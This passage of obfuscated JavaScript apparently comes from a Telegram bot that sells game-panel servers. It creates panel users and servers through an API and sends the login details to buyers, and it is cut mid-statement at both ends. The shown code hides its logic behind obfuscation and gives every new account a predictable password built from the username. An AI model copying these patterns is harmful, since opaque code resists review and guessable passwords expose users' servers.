_0x1ce978[_0x240d04(0x13f1)](_0x476bfb,'\x0a*SUCCESSF'+_0x240d04(0x1ebe)+_0x240d04(0x6b4)+_0x240d04(0x62e)+_0x240d04(0x1ee7)+_0x2ab198['id']+_0x240d04(0xe01)+_0x2ab198['first_name']+'\x20'+_0x2ab198[_0x240d04(0x19fc)]+_0x240d04(0x242c)+(_0x18ae6c[_0x240d04(0x25d5)][_0x240d04(0x187b)]===0x0?_0x240d04(0x1b62):_0x18ae6c[_0x240d04(0x25d5)][_0x240d04(0x187b)])+_0x240d04(0x173)+(_0x1ce978[_0x240d04(0x29a8)](_0x18ae6c[_0x240d04(0x25d5)][_0x240d04(0x26cd)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x18ae6c[_0x240d04(0x25d5)][_0x240d04(0x26cd)])+'\x20MB\x0aCPU:\x20'+_0x18ae6c['limits'][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x476bfb(_0x1ce978['asNVy']);}}}break;case _0x1ce978[_0x240d04(0x2980)]:{if(!_0x69d638)return _0x1ce978[_0x240d04(0x2d87)](_0x476bfb,_0x1ce978[_0x240d04(0xe02)]);const _0x5df424=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978['OmLYe'](_0x5df424[_0x240d04(0x2b45)],0x2))return _0x1ce978['fcWiH'](_0x476bfb,_0x240d04(0x17e9)+_0x240d04(0x2c0b)+'gunaan:\x20'+_0x1ce978[_0x240d04(0x6b5)](_0x1ec495,_0x3e6565)+(_0x240d04(0x329)+'le'));const _0x258333=_0x5df424[0x0],_0x21f33c=_0x5df424[0x1];let _0x50c211=_0x258333,_0x439c7f=global[_0x240d04(0x107)],_0x388bf9=global[_0x240d04(0x241e)],_0x3eaf29=_0x1ce978[_0x240d04(0xd84)],_0x1d9ce0=_0x1ce978['bZLud'],_0x2e77fb=_0x240d04(0x744),_0x2ae6f8=_0x258333+(_0x240d04(0x1ddb)+_0x240d04(0x10cb));try{let _0x3a2e66=_0x1ce978[_0x240d04(0xe17)](_0x258333,_0x1ce978[_0x240d04(0x1bfa)]),_0x30619f=await _0x1ce978[_0x240d04(0x1430)](fetch,domain+_0x1ce978[_0x240d04(0x1f58)],{'method':_0x1ce978['TMKIo'],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978[_0x240d04(0x2dfb)](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x2ae6f8,'username':_0x258333,'first_name':_0x258333,'last_name':_0x258333,'language':'en','password':_0x3a2e66})}),_0x42b401=await _0x30619f[_0x240d04(0x1314)]();if(_0x42b401[_0x240d04(0x247c)])return _0x476bfb(JSON[_0x240d04(0x1cf5)](_0x42b401[_0x240d04(0x247c)][0x0],null,0x2));let _0x1ce89b=_0x42b401[_0x240d04(0x2e69)],_0x1213d2=await _0x1ce978[_0x240d04(0xd25)](fetch,_0x1ce978[_0x240d04(0x15ef)](_0x1ce978[_0x240d04(0x2e5a)](domain,'/api/appli'+_0x240d04(0x14b6)+_0x240d04(0x2b7b)),_0x439c7f),{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978['XDvYW'](_0x1ce978[_0x240d04(0x2c45)],apikey)}});const _0x4a5308=_0x240d04(0x431)+_0x21f33c[_0x240d04(0x1c39)]`@`[0x0]+(_0x240d04(0x266a)+_0x240d04(0xae0))+_0x1ce89b['username']+(_0x240d04(0x1d64)+_0x240d04(0x2424))+_0x3a2e66+(_0x240d04(0x115)+_0x240d04(0x17d2))+linkpanel+('\x0a\x0aNOTE:\x0aOW'+_0x240d04(0x2e3b)+_0x240d04(0x5cb)+'X\x20DATA\x20\x0aAK'+_0x240d04(0xf8d)+'HON\x20DI\x20SIM'+'PAN\x20BAIK\x20B'+_0x240d04(0x2c43)+_0x240d04(0x2337)+_0x240d04(0xce4)+_0x240d04(0x224f)+_0x240d04(0x1b3f)+_0x240d04(0x2b10)+_0x240d04(0x527)+_0x240d04(0x19ae)+'=========='+_0x240d04(0x1775)+_0x240d04(0x1775)+'=\x0a');await _0x23c0de[_0x240d04(0x1986)][_0x240d04(0x2622)](_0x21f33c,{'source':THUMBNAIL},{'caption':_0x4a5308,'parse_mode':_0x1ce978[_0x240d04(0xa1b)],'disable_web_page_preview':!![]});let _0x4be2e7=await _0x1213d2[_0x240d04(0x1314)](),_0x84d710=await fetch(_0x1ce978[_0x240d04(0x2a74)](domain,_0x1ce978[_0x240d04(0x1d08)]),{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978[_0x240d04(0x1683)](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON[_0x240d04(0x1cf5)]({'name':_0x50c211,'description':'\x20','user':_0x1ce89b['id'],'egg':parseInt(_0x439c7f),'docker_image':_0x1ce978[_0x240d04(0x5d6)],'startup':_0x1ce978['SZzZy'],'environment':{'INST':_0x1ce978[_0x240d04(0x10c3)],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x1ce978['WusLf']},'limits':{'memory':_0x3eaf29,'swap':0x0,'disk':_0x2e77fb,'io':0x1f4,'cpu':_0x1d9ce0},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[_0x1ce978[_0x240d04(0x1509)](parseInt,_0x388bf9)],'dedicated_ip':![],'port_range':[]}})}),_0x29e313=await _0x84d710['json']();if(_0x29e313[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x170d)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x29e313[_0x240d04(0x247c)][0x0],null,0x2));let _0x386ef5=_0x29e313[_0x240d04(0x2e69)],_0x40ff5e=await _0x1ce978[_0x240d04(0x21e)](_0x476bfb,_0x240d04(0x1e8)+_0x240d04(0x1ebe)+'SER\x20+\x20SERV'+_0x240d04(0x62e)+_0x240d04(0x1ee7)+_0x1ce89b['id']+'\x0aNAME:\x20'+_0x1ce89b[_0x240d04(0x268b)]+'\x20'+_0x1ce89b['last_name']+'\x0aMEMORY:\x20'+(_0x1ce978[_0x240d04(0x139b)](_0x386ef5['limits'][_0x240d04(0x187b)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x386ef5['limits'][_0x240d04(0x187b)])+'\x20MB\x0aDISK:\x20'+(_0x1ce978['jkmxP'](_0x386ef5['limits'][_0x240d04(0x26cd)],0x0)?_0x240d04(0x1b62):_0x386ef5[_0x240d04(0x25d5)][_0x240d04(0x26cd)])+_0x240d04(0x2541)+_0x386ef5['limits'][_0x240d04(0x1795)]+'%\x0a\x0a');}catch{_0x1ce978['aIPHU'](_0x476bfb,_0x1ce978[_0x240d04(0x273c)]);}}break;case'7gb':{if(!_0x69d638)return _0x476bfb(_0x1ce978[_0x240d04(0xe02)]);const _0x450cd1=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978['FJwxL'](_0x450cd1[_0x240d04(0x2b45)],0x2))return _0x1ce978[_0x240d04(0x210)](_0x476bfb,'*Format\x20sa'+'lah!*\x0aPeng'+'gunaan:\x20'+_0x1ce978[_0x240d04(0x2552)](_0x1ec495,_0x3e6565)+(_0x240d04(0x329)+'le'));const _0x391ade=_0x450cd1[0x0],_0x1b2b40=_0x450cd1[0x1];let _0x57fdcf=_0x391ade,_0x5e8967=global[_0x240d04(0x107)],_0x934d58=global[_0x240d04(0x241e)],_0x22ae8e=_0x1ce978[_0x240d04(0x1f16)],_0x2e8d34=_0x1ce978['VovEb'],_0x6bc639='7050',_0x1b01bf=_0x1ce978['YBCbm'](_0x391ade,_0x1ce978[_0x240d04(0xc84)]);try{let _0x2ec985=_0x1ce978[_0x240d04(0xd9f)](_0x391ade,_0x1ce978[_0x240d04(0x1bfa)]),_0x1d5bcd=await _0x1ce978[_0x240d04(0x2921)](fetch,domain+_0x1ce978['AErmr'],{'method':_0x240d04(0x4c1),'headers':{'Accept':_0x240d04(0x2724)+'n/json','Content-Type':_0x240d04(0x2724)+_0x240d04(0x13e4),'Authorization':_0x1ce978[_0x240d04(0x2c45)]+apikey},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x1b01bf,'username':_0x391ade,'first_name':_0x391ade,'last_name':_0x391ade,'language':'en','password':_0x2ec985})}),_0x4979e0=await _0x1d5bcd[_0x240d04(0x1314)]();if(_0x4979e0[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x283f)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x4979e0[_0x240d04(0x247c)][0x0],null,0x2));let _0x53d78=_0x4979e0[_0x240d04(0x2e69)],_0x2c2a26=await _0x1ce978['fRCzy'](fetch,_0x1ce978['uaSYw'](_0x1ce978[_0x240d04(0x2909)](domain,'/api/appli'+_0x240d04(0x14b6)+_0x240d04(0x2b7b)),_0x5e8967),{'method':_0x240d04(0x27a7),'headers':{'Accept':_0x240d04(0x2724)+_0x240d04(0x13e4),'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x2c45)]+apikey}});const _0x5587a4=_0x240d04(0x431)+_0x1b2b40[_0x240d04(0x1c39)]`@`[0x0]+('\x0a\x0a⎙─➤\x20*👤US'+_0x240d04(0xae0))+_0x53d78[_0x240d04(0x181b)]+(_0x240d04(0x1d64)+_0x240d04(0x2424))+_0x2ec985+('\x0a⎙─➤\x20*🌐LOG'+_0x240d04(0x17d2))+linkpanel+('\x0a\x0aNOTE:\x0aOW'+_0x240d04(0x2e3b)+'MENGIRIM\x201'+_0x240d04(0x2573)+_0x240d04(0xf8d)+_0x240d04(0x366)+_0x240d04(0x24d)+'AIK\x0aKALAU\x20'+_0x240d04(0x2337)+_0x240d04(0xce4)+'G\x20OWNER\x0aTI'+_0x240d04(0x1b3f)+_0x240d04(0x2b10)+_0x240d04(0x527)+_0x240d04(0x19ae)+'=========='+_0x240d04(0x1775)+'=========='+'=\x0a');await _0x23c0de['telegram'][_0x240d04(0x2622)](_0x1b2b40,{'source':THUMBNAIL},{'caption':_0x5587a4,'parse_mode':_0x1ce978[_0x240d04(0xa1b)],'disable_web_page_preview':!![]});let _0xf50b4b=await _0x2c2a26[_0x240d04(0x1314)](),_0x13f3ff=await fetch(_0x1ce978[_0x240d04(0x118a)](domain,_0x240d04(0x12bd)+'cation/ser'+_0x240d04(0xfb1)),{'method':_0x240d04(0x4c1),'headers':{'Accept':_0x240d04(0x2724)+_0x240d04(0x13e4),'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x240d04(0x13f5)+apikey},'body':JSON[_0x240d04(0x1cf5)]({'name':_0x57fdcf,'description':'\x20','user':_0x53d78['id'],'egg':_0x1ce978['Ekgqo'](parseInt,_0x5e8967),'docker_image':_0x1ce978[_0x240d04(0x5d6)],'startup':_0x1ce978[_0x240d04(0x2dd0)],'environment':{'INST':_0x1ce978[_0x240d04(0x10c3)],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x240d04(0x1809)},'limits':{'memory':_0x22ae8e,'swap':0x0,'disk':_0x6bc639,'io':0x1f4,'cpu':_0x2e8d34},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[_0x1ce978[_0x240d04(0x2e94)](parseInt,_0x934d58)],'dedicated_ip':![],'port_range':[]}})}),_0x1fd58f=await _0x13f3ff[_0x240d04(0x1314)]();if(_0x1fd58f[_0x240d04(0x247c)])return _0x1ce978[_0x240d04(0x2cac)](_0x476bfb,JSON['stringify'](_0x1fd58f['errors'][0x0],null,0x2));let _0xf433c1=_0x1fd58f[_0x240d04(0x2e69)],_0x3a029a=await _0x1ce978[_0x240d04(0x2b44)](_0x476bfb,_0x240d04(0x1e8)+_0x240d04(0x1ebe)+_0x240d04(0x6b4)+_0x240d04(0x62e)+_0x240d04(0x1ee7)+_0x53d78['id']+'\x0aNAME:\x20'+_0x53d78[_0x240d04(0x268b)]+'\x20'+_0x53d78[_0x240d04(0x19fc)]+_0x240d04(0x242c)+(_0x1ce978['wVKBg'](_0xf433c1[_0x240d04(0x25d5)][_0x240d04(0x187b)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0xf433c1[_0x240d04(0x25d5)][_0x240d04(0x187b)])+_0x240d04(0x173)+(_0x1ce978['mFKPK'](_0xf433c1[_0x240d04(0x25d5)]['disk'],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0xf433c1[_0x240d04(0x25d5)][_0x240d04(0x26cd)])+'\x20MB\x0aCPU:\x20'+_0xf433c1[_0x240d04(0x25d5)][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x476bfb(_0x1ce978[_0x240d04(0x273c)]);}}break;case _0x240d04(0x1cb2):{if(!_0x69d638)return _0x476bfb(_0x1ce978[_0x240d04(0xe02)]);const _0x58de28=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978[_0x240d04(0x16ca)](_0x58de28[_0x240d04(0x2b45)],0x2))return _0x476bfb(_0x240d04(0x17e9)+_0x240d04(0x2c0b)+'gunaan:\x20'+_0x1ce978[_0x240d04(0x6f4)](_0x1ec495,_0x3e6565)+(_0x240d04(0x329)+'le'));const _0x49642b=_0x58de28[0x0],_0x2326dd=_0x58de28[0x1];let _0x55d285=_0x49642b,_0x22b9b2=global[_0x240d04(0x107)],_0x35390f=global[_0x240d04(0x241e)],_0x446306=_0x1ce978[_0x240d04(0x184b)],_0x56c1c1=_0x1ce978['Wkneq'],_0x441ed6=_0x1ce978['wuBZn'],_0x471b71=_0x1ce978[_0x240d04(0xd47)](_0x49642b,_0x1ce978[_0x240d04(0xc84)]);try{let _0x49d01f=_0x1ce978[_0x240d04(0x1971)](_0x49642b,_0x240d04(0x2061)),_0x4af9e2=await fetch(domain+_0x1ce978[_0x240d04(0x1f58)],{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x240d04(0x2724)+'n/json','Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x1b7)](_0x1ce978['lCEEi'],apikey)},'body':JSON['stringify']({'email':_0x471b71,'username':_0x49642b,'first_name':_0x49642b,'last_name':_0x49642b,'language':'en','password':_0x49d01f})}),_0x344eb3=await _0x4af9e2[_0x240d04(0x1314)]();if(_0x344eb3['errors'])return _0x1ce978[_0x240d04(0x14f1)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x344eb3[_0x240d04(0x247c)][0x0],null,0x2));let _0x327049=_0x344eb3['attributes'],_0x164595=await _0x1ce978[_0x240d04(0x2921)](fetch,_0x1ce978['cZNqI'](domain,_0x1ce978['FoSRt'])+_0x22b9b2,{'method':_0x240d04(0x27a7),'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978['lCEEi']+apikey}});const _0x40e2b4=_0x240d04(0x431)+_0x2326dd[_0x240d04(0x1c39)]`@`[0x0]+(_0x240d04(0x266a)+_0x240d04(0xae0))+_0x327049[_0x240d04(0x181b)]+(_0x240d04(0x1d64)+_0x240d04(0x2424))+_0x49d01f+(_0x240d04(0x115)+'IN*\x20:\x20')+linkpanel+(_0x240d04(0x2863)+_0x240d04(0x2e3b)+_0x240d04(0x5cb)+_0x240d04(0x2573)+_0x240d04(0xf8d)+_0x240d04(0x366)+_0x240d04(0x24d)+_0x240d04(0x2c43)+_0x240d04(0x2337)+_0x240d04(0xce4)+'G\x20OWNER\x0aTI'+'DAK\x20DAPAT\x20'+'MENGIRIM\x20A'+_0x240d04(0x527)+_0x240d04(0x19ae)+_0x240d04(0x1775)+_0x240d04(0x1775)+'=========='+'=\x0a');await _0x23c0de[_0x240d04(0x1986)][_0x240d04(0x2622)](_0x2326dd,{'source':THUMBNAIL},{'caption':_0x40e2b4,'parse_mode':_0x240d04(0x21a9),'disable_web_page_preview':!![]});let _0xb5b2e1=await _0x164595[_0x240d04(0x1314)](),_0x554f5b=await _0x1ce978[_0x240d04(0x1430)](fetch,domain+_0x1ce978['dWIMx'],{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978['SfeBg']('Bearer\x20',apikey)},'body':JSON[_0x240d04(0x1cf5)]({'name':_0x55d285,'description':'\x20','user':_0x327049['id'],'egg':_0x1ce978['kFocV'](parseInt,_0x22b9b2),'docker_image':_0x1ce978[_0x240d04(0x5d6)],'startup':_0x240d04(0x2c6b)+_0x240d04(0x1253)+_0x240d04(0xbac)+_0x240d04(0x10d8)+_0x240d04(0xc7b)+_0x240d04(0x1bbc)+_0x240d04(0x1441)+_0x240d04(0x2b40)+_0x240d04(0x2969)+_0x240d04(0x29fb)+_0x240d04(0x1657)+_0x240d04(0x718)+_0x240d04(0xb3b)+_0x240d04(0x25be)+_0x240d04(0x1b5b)+_0x240d04(0x2221)+'!\x20-z\x20${UNN'+_0x240d04(0x883)+_0x240d04(0x12dd)+_0x240d04(0x16e0)+_0x240d04(0x12b3)+'m\x20uninstal'+_0x240d04(0x7e1)+'_PACKAGES}'+_0x240d04(0x2e3d)+_0x240d04(0x168d)+'container/'+_0x240d04(0x25b7)+'on\x20];\x20then'+_0x240d04(0xa26)+_0x240d04(0x792)+'install;\x20f'+_0x240d04(0x1a34)+_0x240d04(0x391)+_0x240d04(0x266e),'environment':{'INST':_0x1ce978[_0x240d04(0x10c3)],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x1ce978[_0x240d04(0x2e0b)]},'limits':{'memory':_0x446306,'swap':0x0,'disk':_0x441ed6,'io':0x1f4,'cpu':_0x56c1c1},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[parseInt(_0x35390f)],'dedicated_ip':![],'port_range':[]}})}),_0x4fe68d=await _0x554f5b[_0x240d04(0x1314)]();if(_0x4fe68d['errors'])return _0x1ce978[_0x240d04(0x6fb)](_0x476bfb,JSON[_0x240d04(0x1cf5)](_0x4fe68d[_0x240d04(0x247c)][0x0],null,0x2));let _0x1a15de=_0x4fe68d['attributes'],_0x125bd9=await _0x1ce978[_0x240d04(0x21e)](_0x476bfb,'\x0a*SUCCESSF'+_0x240d04(0x1ebe)+'SER\x20+\x20SERV'+'ER*\x0aTYPE:\x20'+_0x240d04(0x1ee7)+_0x327049['id']+_0x240d04(0xe01)+_0x327049[_0x240d04(0x268b)]+'\x20'+_0x327049[_0x240d04(0x19fc)]+_0x240d04(0x242c)+(_0x1ce978[_0x240d04(0x169)](_0x1a15de[_0x240d04(0x25d5)]['memory'],0x0)?_0x1ce978['UTfCZ']:_0x1a15de[_0x240d04(0x25d5)]['memory'])+_0x240d04(0x173)+(_0x1a15de[_0x240d04(0x25d5)][_0x240d04(0x26cd)]===0x0?_0x240d04(0x1b62):_0x1a15de[_0x240d04(0x25d5)]['disk'])+_0x240d04(0x2541)+_0x1a15de[_0x240d04(0x25d5)][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x476bfb('yah\x20gagal\x20'+_0x240d04(0x690)+_0x240d04(0x1848)+_0x240d04(0xe6d)+'n\x20pltc\x20and'+'a_');}}break;case _0x240d04(0x1fca):{if(!_0x69d638)return _0x1ce978[_0x240d04(0x10f1)](_0x476bfb,_0x1ce978[_0x240d04(0xe02)]);const _0x4e7c86=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978[_0x240d04(0x8e4)](_0x4e7c86[_0x240d04(0x2b45)],0x2))return _0x1ce978['QFLsq'](_0x476bfb,'*Format\x20sa'+'lah!*\x0aPeng'+_0x240d04(0x2458)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x329)+'le'));const _0x2956bb=_0x4e7c86[0x0],_0x1d0724=_0x4e7c86[0x1];let _0x549960=_0x2956bb,_0x47151a=global[_0x240d04(0x107)],_0x104b44=global[_0x240d04(0x241e)],_0x503cde=_0x240d04(0x644),_0x124556=_0x1ce978[_0x240d04(0xe9c)],_0x5de7ee=_0x1ce978[_0x240d04(0x1f4f)],_0x383eb5=_0x1ce978[_0x240d04(0x296c)](_0x2956bb,_0x240d04(0x1ddb)+_0x240d04(0x10cb));try{let _0xaa42c=_0x2956bb+_0x1ce978[_0x240d04(0x1bfa)],_0xb00754=await _0x1ce978['KwYyt'](fetch,_0x1ce978[_0x240d04(0xa8b)](domain,_0x1ce978['AErmr']),{'method':_0x1ce978['TMKIo'],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x2c45)]+apikey},'body':JSON[_0x240d04(0x1cf5)]({'email':_0x383eb5,'username':_0x2956bb,'first_name':_0x2956bb,'last_name':_0x2956bb,'language':'en','password':_0xaa42c})}),_0x5353f9=await _0xb00754['json']();if(_0x5353f9['errors'])return _0x1ce978[_0x240d04(0x18e3)](_0x476bfb,JSON['stringify'](_0x5353f9[_0x240d04(0x247c)][0x0],null,0x2));let _0x427348=_0x5353f9[_0x240d04(0x2e69)],_0xe4d00a=await _0x1ce978['MXkzV'](fetch,_0x1ce978['OgTcB'](_0x1ce978[_0x240d04(0x2e58)](domain,_0x240d04(0x12bd)+_0x240d04(0x14b6)+_0x240d04(0x2b7b)),_0x47151a),{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x240d04(0x2724)+_0x240d04(0x13e4),'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x2a0e)](_0x1ce978[_0x240d04(0x2c45)],apikey)}});const _0x1aa651=_0x240d04(0x431)+_0x1d0724[_0x240d04(0x1c39)]`@`[0x0]+(_0x240d04(0x266a)+_0x240d04(0xae0))+_0x427348[_0x240d04(0x181b)]+('\x0a⎙─➤\x20*🔐PAS'+'SWORD*\x20:\x20')+_0xaa42c+(_0x240d04(0x115)+'IN*\x20:\x20')+linkpanel+(_0x240d04(0x2863)+_0x240d04(0x2e3b)+'MENGIRIM\x201'+_0x240d04(0x2573)+_0x240d04(0xf8d)+_0x240d04(0x366)+_0x240d04(0x24d)+'AIK\x0aKALAU\x20'+_0x240d04(0x2337)+_0x240d04(0xce4)+_0x240d04(0x224f)+_0x240d04(0x1b3f)+_0x240d04(0x2b10)+_0x240d04(0x527)+_0x240d04(0x19ae)+_0x240d04(0x1775)+'=========='+_0x240d04(0x1775)+'=\x0a');await _0x23c0de[_0x240d04(0x1986)][_0x240d04(0x2622)](_0x1d0724,{'source':THUMBNAIL},{'caption':_0x1aa651,'parse_mode':_0x1ce978[_0x240d04(0xa1b)],'disable_web_page_preview':!![]});let _0x28b0d3=await _0xe4d00a['json'](),_0x5cb537=await _0x1ce978[_0x240d04(0x2dbe)](fetch,domain+_0x1ce978[_0x240d04(0x1d08)],{'method':_0x240d04(0x4c1),'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x240d04(0x2724)+_0x240d04(0x13e4),'Authorization':_0x1ce978['plIhu'](_0x1ce978[_0x240d04(0x2c45)],apikey)},'body':JSON['stringify']({'name':_0x549960,'description':'\x20','user':_0x427348['id'],'egg':parseInt(_0x47151a),'docker_image':'ghcr.io/pa'+_0x240d04(0xd07)+_0x240d04(0xb2d)+_0x240d04(0x115a),'startup':_0x1ce978[_0x240d04(0x2dd0)],'environment':{'INST':_0x1ce978[_0x240d04(0x10c3)],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x240d04(0x1809)},'limits':{'memory':_0x503cde,'swap':0x0,'disk':_0x5de7ee,'io':0x1f4,'cpu':_0x124556},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[_0x1ce978[_0x240d04(0x342)](parseInt,_0x104b44)],'dedicated_ip':![],'port_range':[]}})}),_0xff1e70=await _0x5cb537[_0x240d04(0x1314)]();if(_0xff1e70['errors'])return _0x476bfb(JSON[_0x240d04(0x1cf5)](_0xff1e70[_0x240d04(0x247c)][0x0],null,0x2));let _0x62a540=_0xff1e70[_0x240d04(0x2e69)],_0x4a2f70=await _0x1ce978[_0x240d04(0x577)](_0x476bfb,_0x240d04(0x1e8)+_0x240d04(0x1ebe)+'SER\x20+\x20SERV'+_0x240d04(0x62e)+_0x240d04(0x1ee7)+_0x427348['id']+_0x240d04(0xe01)+_0x427348[_0x240d04(0x268b)]+'\x20'+_0x427348[_0x240d04(0x19fc)]+_0x240d04(0x242c)+(_0x1ce978['fJEMW'](_0x62a540[_0x240d04(0x25d5)][_0x240d04(0x187b)],0x0)?_0x1ce978[_0x240d04(0xc1a)]:_0x62a540[_0x240d04(0x25d5)]['memory'])+_0x240d04(0x173)+(_0x62a540[_0x240d04(0x25d5)][_0x240d04(0x26cd)]===0x0?_0x1ce978[_0x240d04(0xc1a)]:_0x62a540['limits'][_0x240d04(0x26cd)])+_0x240d04(0x2541)+_0x62a540[_0x240d04(0x25d5)][_0x240d04(0x1795)]+_0x240d04(0x733));}catch{_0x1ce978[_0x240d04(0x1c87)](_0x476bfb,_0x1ce978['asNVy']);}}break;case _0x1ce978[_0x240d04(0x2b02)]:{if(!_0x69d638)return _0x1ce978[_0x240d04(0x1522)](_0x476bfb,_0x1ce978[_0x240d04(0xe02)]);const _0x406fbb=_0x33cfb1[_0x240d04(0x1c39)](',');if(_0x1ce978[_0x240d04(0x1d58)](_0x406fbb['length'],0x2))return _0x1ce978[_0x240d04(0x1d9e)](_0x476bfb,_0x240d04(0x17e9)+_0x240d04(0x2c0b)+_0x240d04(0x2458)+_0x1ce978[_0x240d04(0x2dd4)](_0x1ec495,_0x3e6565)+('\x20user,idte'+'le'));const _0x49aa5d=_0x406fbb[0x0],_0xd428bb=_0x406fbb[0x1];let _0x33ec89=_0x49aa5d,_0x395242=global['eggsnya'],_0x3ff606=global[_0x240d04(0x241e)],_0x512262=_0x1ce978[_0x240d04(0xedd)],_0x3f2964=_0x1ce978['iiSaq'],_0x2ea81e=_0x1ce978[_0x240d04(0xedd)],_0x1f11de=_0x1ce978[_0x240d04(0x388)](_0x49aa5d,_0x1ce978[_0x240d04(0xc84)]);try{let _0x5d6f7a=_0x49aa5d+'001',_0x3856ba=await _0x1ce978[_0x240d04(0x2dbe)](fetch,_0x1ce978[_0x240d04(0x6f3)](domain,_0x1ce978[_0x240d04(0x1f58)]),{'method':_0x1ce978[_0x240d04(0x30e)],'headers':{'Accept':_0x1ce978['btLYK'],'Content-Type':_0x1ce978['btLYK'],'Authorization':_0x1ce978[_0x240d04(0x466)](_0x1ce978['lCEEi'],apikey)},'body':JSON['stringify']({'email':_0x1f11de,'username':_0x49aa5d,'first_name':_0x49aa5d,'last_name':_0x49aa5d,'language':'en','password':_0x5d6f7a})}),_0x2606f4=await _0x3856ba[_0x240d04(0x1314)]();if(_0x2606f4[_0x240d04(0x247c)])return _0x476bfb(JSON['stringify'](_0x2606f4[_0x240d04(0x247c)][0x0],null,0x2));let _0x113b54=_0x2606f4['attributes'],_0x34db41=await fetch(_0x1ce978[_0x240d04(0x2436)](domain,_0x1ce978[_0x240d04(0x1615)])+_0x395242,{'method':_0x1ce978[_0x240d04(0x1764)],'headers':{'Accept':_0x1ce978[_0x240d04(0x1030)],'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978['vYWKI'](_0x1ce978[_0x240d04(0x2c45)],apikey)}});const _0x2d24f2='Hai\x20@'+_0xd428bb[_0x240d04(0x1c39)]`@`[0x0]+(_0x240d04(0x266a)+_0x240d04(0xae0))+_0x113b54['username']+(_0x240d04(0x1d64)+_0x240d04(0x2424))+_0x5d6f7a+('\x0a⎙─➤\x20*🌐LOG'+'IN*\x20:\x20')+linkpanel+(_0x240d04(0x2863)+'NER\x20HANYA\x20'+_0x240d04(0x5cb)+_0x240d04(0x2573)+_0x240d04(0xf8d)+_0x240d04(0x366)+_0x240d04(0x24d)+'AIK\x0aKALAU\x20'+_0x240d04(0x2337)+'ANDA\x20HILAN'+_0x240d04(0x224f)+_0x240d04(0x1b3f)+_0x240d04(0x2b10)+'KUN\x20ANDA\x20L'+_0x240d04(0x19ae)+_0x240d04(0x1775)+'=========='+_0x240d04(0x1775)+'=\x0a');await _0x23c0de[_0x240d04(0x1986)][_0x240d04(0x2622)](_0xd428bb,{'source':THUMBNAIL},{'caption':_0x2d24f2,'parse_mode':_0x1ce978[_0x240d04(0xa1b)],'disable_web_page_preview':!![]});let _0x33873b=await _0x34db41[_0x240d04(0x1314)](),_0x25bea4=await fetch(_0x1ce978['Odcty'](domain,_0x1ce978[_0x240d04(0x1d08)]),{'method':_0x1ce978['TMKIo'],'headers':{'Accept':_0x240d04(0x2724)+_0x240d04(0x13e4),'Content-Type':_0x1ce978[_0x240d04(0x1030)],'Authorization':_0x1ce978[_0x240d04(0x2333)]('Bearer\x20',apikey)},'body':JSON[_0x240d04(0x1cf5)]({'name':_0x33ec89,'description':'\x20','user':_0x113b54['id'],'egg':_0x1ce978[_0x240d04(0xd90)](parseInt,_0x395242),'docker_image':_0x1ce978['MzhZx'],'startup':_0x1ce978[_0x240d04(0x2dd0)],'environment':{'INST':_0x1ce978['RksBX'],'USER_UPLOAD':'0','AUTO_UPDATE':'0','CMD_RUN':_0x1ce978[_0x240d04(0x2e0b)]},'limits':{'memory':_0x512262,'swap':0x0,'disk':_0x2ea81e,'io':0x1f4,'cpu':_0x3f2964},'feature_limits':{'databases':0x5,'backups':0x5,'allocations':0x1},'deploy':{'locations':[_0x1ce978['GKeDs'](parseInt,_0x3ff606)],'